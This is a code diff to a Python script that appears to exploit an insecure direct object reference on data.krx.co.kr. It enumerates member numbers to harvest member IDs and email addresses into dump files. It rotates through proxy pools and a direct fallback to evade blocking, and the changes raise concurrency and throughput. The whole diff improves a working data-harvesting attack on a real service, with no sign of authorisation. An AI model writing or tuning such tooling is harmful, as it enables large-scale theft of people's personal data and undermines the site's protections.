@@ -14,8 +14,9 @@ import os
 import random
 import threading
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Any
+from collections import deque
+from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, as_completed, wait
+from typing import Any, Callable, Iterable, Iterator
 from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
 
 import requests
@@ -47,6 +48,7 @@ UA = (
 START = int(os.environ.get("KRX_START", "2000005000"))
 END = int(os.environ.get("KRX_END", "2000223000"))
 WORKERS = int(os.environ.get("KRX_WORKERS", "16"))
+INFLIGHT = int(os.environ.get("KRX_INFLIGHT", "0")) or max(WORKERS * 2, 8)
 OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
 STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
 PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
@@ -54,9 +56,13 @@ PROXY_TTL = int(os.environ.get("KRX_PROXY_TTL", "90"))
 EXTRACT_COUNT = int(os.environ.get("KRX_EXTRACT_COUNT", "10"))
 KEEP_LIVE = int(os.environ.get("KRX_KEEP_LIVE", "12"))
 PICK_N = int(os.environ.get("KRX_PICK_N", "12"))
+HTTP_TIMEOUT = float(os.environ.get("KRX_HTTP_TIMEOUT", "8"))
+SESS_CACHE = int(os.environ.get("KRX_SESS_CACHE", "32"))
+BAD_CAP = int(os.environ.get("KRX_BAD_CAP", "3000"))
 USE_DIRECT = os.environ.get("KRX_USE_DIRECT", "1") != "0"
 DIRECT = "__direct__"
 DIRECT_COOLDOWN = int(os.environ.get("KRX_DIRECT_COOLDOWN", "180"))
+DIRECT_WHEN_GOOD_LT = int(os.environ.get("KRX_DIRECT_WHEN_GOOD_LT", "3"))
 EXTRACT_DEAD_HINTS = ("用完", "不足", "余额", "过期", "失效", "次数已", "提取失败", "订单不存在", "INVALID")
 CLOUD_GOOD_FROM = 2000005966
 KNOWN_MBR = 2000008331
@@ -66,7 +72,42 @@ EMPTY_MBR = 1999999999
 _tls = threading.local()
 _lock = threading.Lock()
 _stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "retry": 0, "t0": time.time()}
+_recent: deque[float] = deque()
 POOL: "ProxyPool | None" = None
+
+
+def window_rate(now: float | None = None, seconds: float = 30.0) -> float:
+    """Completions per second over the last `seconds` (not lifetime average)."""
+    t = now if now is not None else time.time()
+    while _recent and t - _recent[0] > seconds:
+        _recent.popleft()
+    if len(_recent) < 2:
+        return 0.0
+    span = t - _recent[0]
+    if span <= 0:
+        return 0.0
+    return (len(_recent) - 1) / span
+
+
+def iter_inflight(ex: ThreadPoolExecutor, items: Iterable[Any], submit: Callable, window: int) -> Iterator:
+    """Yield finished futures as they complete, keeping `window` jobs in flight."""
+    it = iter(items)
+    inflight: set = set()
+    exhausted = False
+    win = max(int(window), 1)
+    while True:
+        while not exhausted and len(inflight) < win:
+            try:
+                item = next(it)
+            except StopIteration:
+                exhausted = True
+                break
+            inflight.add(submit(ex, item))
+        if not inflight:
+            return
+        done, inflight = wait(inflight, return_when=FIRST_COMPLETED)
+        for fut in done:
+            yield fut
 
 
 def with_extract_count(url: str, n: int) -> str:
@@ -275,12 +316,23 @@ class ProxyPool:
             return not is_proxy_auth_fail(e) and False
 
     def _expire_old(self) -> None:
+        """Drop expired IPs from born/good/proxies so pick() stays O(live). Caller holds _lock."""
         now = time.time()
         dead = [p for p, t0 in self.born.items() if now - t0 >= PROXY_TTL]
+        if not dead:
+            return
+        dead_set = set(dead)
         for p in dead:
-            self.bad.add(p)
-            if p in self.good:
-                self.good.remove(p)
+            self.born.pop(p, None)
+            self.strikes.pop(p, None)
+        self.good = [p for p in self.good if p not in dead_set]
+        self.proxies = [p for p in self.proxies if p not in dead_set]
+
+    def prune(self) -> None:
+        with _lock:
+            self._expire_old()
+            if len(self.bad) > BAD_CAP:
+                self.bad.clear()
 
     def _next_url(self) -> str | None:
         alive = self._alive_urls()
@@ -355,9 +407,11 @@ class ProxyPool:
                     if p not in self.good:
                         self.good.append(p)
                 self._expire_old()
+                if len(self.bad) > BAD_CAP:
+                    self.bad.clear()
             print(
                 f"proxy_pool +{len(got)} usable={len(ok_list)} good={self.good_n()} "
-                f"apis={len(self._alive_urls())}/{len(self.urls)}",
+                f"born={len(self.born)} apis={len(self._alive_urls())}/{len(self.urls)}",
                 flush=True,
             )
         finally:
@@ -368,16 +422,20 @@ class ProxyPool:
             self.fetch()
 
     def pick(self) -> str | None:
+        now = time.time()
         with _lock:
-            self._expire_old()
-            fresh = [p for p in self.good if self._fresh(p)]
+            fresh = [p for p in self.good if (now - self.born.get(p, 0)) < PROXY_TTL and p not in self.bad]
             fresh.sort(key=lambda p: self.born.get(p, 0), reverse=True)
             live = fresh[:PICK_N]
-            direct_ok = self.use_direct and time.time() >= self.direct_until
-        if direct_ok:
-            live = live + [DIRECT]
-        if live:
-            with _lock:
+            n_good = len(fresh)
+            direct_ok = (
+                self.use_direct
+                and now >= self.direct_until
+                and n_good < DIRECT_WHEN_GOOD_LT
+            )
+            if direct_ok:
+                live = live + [DIRECT]
+            if live:
                 self.i += 1
                 return live[self.i % len(live)]
         if self.use_direct:
@@ -438,7 +496,7 @@ def session_for(proxy: str | None) -> requests.Session:
         if proxy and proxy != DIRECT:
             s.proxies.update({"http": proxy, "https": proxy})
         cache[key] = s
-        if len(cache) > 12:
+        if len(cache) > SESS_CACHE:
             old = next(iter(cache))
             if old != key:
                 cache.pop(old, None)
@@ -449,6 +507,8 @@ def drop_session(proxy: str | None) -> None:
     cache = getattr(_tls, "cache", None)
     if cache:
         cache.pop(proxy or "direct", None)
+    if getattr(_tls, "proxy", None) == proxy:
+        _tls.proxy = None
 
 
 def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
@@ -456,22 +516,26 @@ def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
     if pool is None:
         raise RuntimeError("proxy pool not initialized")
     fails = 0
+    proxy = getattr(_tls, "proxy", None)
     while True:
-        proxy = pool.pick()
         if proxy is None:
-            time.sleep(0.4)
-            continue
+            proxy = pool.pick()
+            if proxy is None:
+                time.sleep(0.2)
+                continue
+            _tls.proxy = proxy
         s = session_for(proxy)
         try:
             r = s.post(
                 url,
                 data=data,
                 headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
-                timeout=15,
+                timeout=HTTP_TIMEOUT,
             )
-            if is_proxy_auth_fail(text=r.text):
+            if r.status_code == 407 or is_proxy_auth_fail(text=r.text):
                 drop_session(proxy)
                 pool.fail(proxy, auth=True)
+                proxy = None
                 fails += 1
                 continue
             body = json_from_response(r)
@@ -481,15 +545,17 @@ def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
         except Exception as e:
             drop_session(proxy)
             pool.fail(proxy, auth=is_proxy_auth_fail(e))
+            proxy = None
             fails += 1
             if fails % 4 == 0:
-                time.sleep(min(0.25 * (fails // 4), 2.0) + random.random() * 0.2)
+                time.sleep(min(0.15 * (fails // 4), 1.0) + random.random() * 0.1)
             continue
         drop_session(proxy)
         pool.fail(proxy)
+        proxy = None
         fails += 1
         if fails % 4 == 0:
-            time.sleep(min(0.25 * (fails // 4), 2.0) + random.random() * 0.2)
+            time.sleep(min(0.15 * (fails // 4), 1.0) + random.random() * 0.1)
 
 
 def mbr_id(mno: int) -> str | None:
@@ -730,8 +796,9 @@ def main() -> None:
 
     def _topup() -> None:
         while True:
-            time.sleep(12)
+            time.sleep(8)
             try:
+                pool.prune()
                 if pool.good_n() < KEEP_LIVE and pool._alive_urls():
                     pool.fetch()
             except Exception:
@@ -743,7 +810,8 @@ def main() -> None:
     idor_jobs = tail + head + holes
     total = len(mail_jobs) + len(idor_jobs)
     print(
-        f"workers={WORKERS} mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
+        f"workers={WORKERS} inflight={INFLIGHT} timeout={HTTP_TIMEOUT}s "
+        f"mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
         f"head={len(head)} tail={len(tail)} holes={len(holes)} "
         f"have_id={len(have_id)} have_email={len(have_email)} panda={len(pool.urls)}",
         flush=True,
@@ -754,69 +822,81 @@ def main() -> None:
 
     def handle(mno: int, mid: str | None, em: str | None, kind: str) -> None:
         nonlocal last_flush
+        now = time.time()
+        scan_row = id_row = em_row = None
         with _lock:
             _stats["done"] += 1
+            _recent.append(now)
             if kind == "idor":
-                sw.writerow([mno, "id" if mid else "empty", mid or ""])
+                scan_row = [mno, "id" if mid else "empty", mid or ""]
                 if mid and mno not in wrote_id:
                     _stats["ids"] += 1
                     wrote_id.add(mno)
-                    iw.writerow([mno, mid])
+                    id_row = [mno, mid]
             elif kind == "mail" and not em:
-                sw.writerow([mno, "nomail", mid or ""])
+                scan_row = [mno, "nomail", mid or ""]
             if em and mno not in wrote_em:
                 _stats["emails"] += 1
                 wrote_em.add(mno)
-                ew.writerow([mno, mid, em])
+                em_row = [mno, mid, em]
+            snap = {
+                "done": _stats["done"],
+                "ids": _stats["ids"],
+                "emails": _stats["emails"],
+                "err": _stats["err"],
+                "retry": _stats["retry"],
+            }
+            log_now = now - last_flush > 5
+        if scan_row:
+            sw.writerow(scan_row)
+        if id_row:
+            iw.writerow(id_row)
+        if em_row:
+            ew.writerow(em_row)
             ef.flush()
+        if log_now:
             idf.flush()
             sf.flush()
-            done = _stats["done"]
-            if time.time() - last_flush > 5:
-                elapsed = max(time.time() - _stats["t0"], 0.001)
-                rate = done / elapsed
-                remain = max(total - done, 0)
-                eta = remain / rate if rate else 0
-                json.dump(
-                    {
-                        "done": done,
-                        "total": total,
-                        "ids": _stats["ids"],
-                        "emails": _stats["emails"],
-                        "err": _stats["err"],
-                        "retry": _stats["retry"],
-                        "good_proxies": len(pool.good),
-                        "rate_per_s": round(rate, 2),
-                        "eta_min": round(eta / 60, 1),
-                        "last": mno,
-                    },
-                    open(state_path, "w"),
-                )
-                print(
-                    f"done={done}/{total} ids+={_stats['ids']} emails+={_stats['emails']} "
-                    f"retry={_stats['retry']} good={len(pool.good)} "
-                    f"{rate:.1f}/s eta={eta/60:.1f}min last={mno}",
-                    flush=True,
-                )
-                last_flush = time.time()
+            elapsed = max(now - _stats["t0"], 0.001)
+            avg = snap["done"] / elapsed
+            win = window_rate(now, 30.0)
+            remain = max(total - snap["done"], 0)
+            use = win if win > 0 else avg
+            eta = remain / use if use else 0
+            good_n = pool.good_n()
+            state = {
+                "done": snap["done"],
+                "total": total,
+                "ids": snap["ids"],
+                "emails": snap["emails"],
+                "err": snap["err"],
+                "retry": snap["retry"],
+                "good_proxies": good_n,
+                "born": len(pool.born),
+                "rate_per_s": round(win or avg, 2),
+                "avg_per_s": round(avg, 2),
+                "eta_min": round(eta / 60, 1),
+                "last": mno,
+            }
+            with open(state_path, "w", encoding="utf-8") as sfj:
+                json.dump(state, sfj)
+            print(
+                f"done={snap['done']}/{total} ids+={snap['ids']} emails+={snap['emails']} "
+                f"retry={snap['retry']} good={good_n} born={len(pool.born)} "
+                f"win={win:.1f}/s avg={avg:.1f}/s eta={eta/60:.1f}min last={mno}",
+                flush=True,
+            )
+            last_flush = now
 
-    def run_batch(futs, kind: str) -> None:
-        for fut in as_completed(futs):
-            mno, mid, em = fut.result()
-            handle(mno, mid, em, kind)
-
-    chunk = 80
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
-        i = 0
-        while i < len(idor_jobs):
-            batch = idor_jobs[i : i + chunk]
-            run_batch([ex.submit(one_idor, n) for n in batch], "idor")
-            i += chunk
-        i = 0
-        while i < len(mail_jobs):
-            batch = mail_jobs[i : i + chunk]
-            run_batch([ex.submit(one_mail, n, mid) for n, mid in batch], "mail")
-            i += chunk
+        for fut in iter_inflight(ex, idor_jobs, lambda e, n: e.submit(one_idor, n), INFLIGHT):
+            mno, mid, em = fut.result()
+            handle(mno, mid, em, "idor")
+        for fut in iter_inflight(
+            ex, mail_jobs, lambda e, item: e.submit(one_mail, item[0], item[1]), INFLIGHT
+        ):
+            mno, mid, em = fut.result()
+            handle(mno, mid, em, "mail")
 
     ef.close()
     idf.close()
